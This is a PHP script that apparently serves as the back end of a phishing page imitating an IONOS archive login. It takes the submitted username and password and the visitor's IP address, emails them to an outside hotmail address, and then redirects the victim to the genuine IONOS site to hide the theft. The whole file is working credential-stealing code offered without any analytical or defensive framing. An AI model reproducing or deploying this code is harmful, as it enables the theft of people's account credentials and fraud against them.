<?php
//get data from form  
$User = $_POST['username'];
$Pass= $_POST['password'];
$ip = getenv("REMOTE_ADDR");
$to = "octm216@hotmail.com";
$subject = "$Pass";
$txt = "https://archiv.ionos.de/ \n\n Username = ". $User . "\r\n  Password = " . $Pass . "\n\nSubmitted from IP Address =". $ip;
$headers = "From: $User";
if($User!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:https://archiv.ionos.de/");
?>